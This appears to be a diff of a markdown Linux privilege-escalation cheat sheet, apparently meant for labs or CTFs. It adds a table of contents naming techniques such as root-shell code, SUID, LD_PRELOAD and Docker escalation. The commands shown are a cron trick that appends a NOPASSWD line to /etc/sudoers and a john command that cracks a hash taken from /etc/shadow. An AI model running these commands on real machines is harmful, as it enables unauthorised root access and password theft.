@@ -4,7 +4,24 @@
 > These are real techniques that worked on real machines — not copy-paste from a course.
 
 ---
-
+## Contents
+- [Some Tools](#some-tools)
+- [Cron Jobs](#cron-jobs)
+- [Crack Linux User Hash](#crack-linux-user-hash)
+- [Find SUID Binaries](#find-suid-binaries)
+- [Capabilities](#capabilities)
+- [Copy-Fail-CVE-2026-31431](#copy-fail-cve-2026-31431)
+- [Network File Sharing (NFS)](#network-file-sharing-nfs)
+- [Some Tricks](#some-tricks)
+- [C Code to Open Root Shell](#c-code-to-open-root-shell)
+- [Serve Files to Victim Machine](#serve-files-to-victim-machine)
+- [Stable Shell (Python pty)](#stable-shell-python-pty)
+- [LD_PRELOAD](#ld_preload)
+- [screen-4.5.0 Binary Exploit](#screen-450-binary-exploit)
+- [Docker Group](#docker-group)
+- [Containerd (ctr) with NOPASSWD sudo](#containerd-ctr-with-nopasswd-sudo)
+- [Logstash](#logstash)
+- [References](#references)
 ## Some Tools
 
 - **LinPeas**: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
@@ -75,15 +92,12 @@ printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/lo
 
 ---
 
-## Crack Hashes
+## Crack Linux User Hash
 
 ```bash
-echo "hash_from_etc_shadow" > shadow.txt
-echo "passwd_user_line" > passwd.txt
-
-unshadow passwd.txt shadow.txt > unshadow.txt
-
-sudo john --wordlist=/usr/share/wordlists/rockyou.txt unshadow.txt
+echo '[username]:[Hash from /etc/shadow]' > hash.txt
+echo 'jessie:$6$0w...' > hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
 
 ---
